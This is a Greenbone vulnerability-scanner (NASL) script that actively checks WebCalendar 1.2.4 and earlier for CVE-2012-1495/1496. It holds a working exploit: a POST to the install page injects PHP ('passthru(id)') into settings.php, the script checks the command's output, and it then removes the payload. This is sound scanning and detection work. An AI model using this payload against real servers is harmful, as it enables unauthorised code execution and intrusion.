# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:webcalendar:webcalendar";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103476");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-04-25 09:40:31 +0200 (Wed, 25 Apr 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-29 20:36:00 +0000 (Wed, 29 Jan 2020)");

  script_cve_id("CVE-2012-1495", "CVE-2012-1496");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WebCalendar <= 1.2.4 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_webcalendar_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webcalendar/http/detected");

  script_tag(name:"summary", value:"WebCalendar is prone to multiple input validation
  vulnerabilities because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests and checks the
  responses.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to inject arbitrary PHP
  code and include and execute arbitrary files from the vulnerable system in the context of the
  affected application.");

  script_tag(name:"affected", value:"WebCalendar version 1.2.4 and probably prior.");

  script_tag(name:"solution", value:"Reports indicate vendor updates are available. Please contact
  the vendor for more information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53207");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522460");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port:port);

phpcode = '*/print(____);passthru(id);die;';
payload = 'app_settings=1&form_user_inc=user.php&form_single_user_login=' + phpcode;

req = string("POST ", dir, "/install/index.php HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Length: ", strlen(payload), "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Connection: close\r\n\r\n", payload);
res = http_send_recv(port:port, data:req);

if(!res)
  exit(0);

if (res !~ "^HTTP/1\.[01] 200")
  exit(99);

url = dir + "/includes/settings.php";

if (http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
  # nb: Remove the payload from settings.php
  payload = 'app_settings=1&form_user_inc=user.php&form_single_user_login=';

  req = string("POST ", dir, "/install/index.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Length: ", strlen(payload),"\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Connection: close\r\n\r\n",payload);
  res = http_send_recv(port:port, data:req);

  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
